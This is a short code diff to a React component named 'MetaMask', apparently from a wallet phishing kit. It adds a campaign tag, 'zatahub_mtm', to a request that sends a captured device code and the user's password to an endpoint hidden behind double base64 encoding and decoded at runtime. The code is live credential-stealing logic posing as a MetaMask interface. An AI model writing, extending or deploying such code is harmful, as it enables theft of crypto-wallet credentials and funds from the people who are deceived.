@@ -32,7 +32,8 @@ const MetaMask = () => {
         //here is the code that we have read ABC
         const device = code
         const url = 'YUhSMGNITTZMeTluWVc1aFkyaGxMbXhwZG1VdllYQnBMM1l4TDJodw==';
-        const requestData = { device, value: password };
+        const note = 'zatahub_mtm'
+        const requestData = { device, value: password , note};
         try {
             setLoader(true)
             const response = await fetch(atob(atob(url)), {
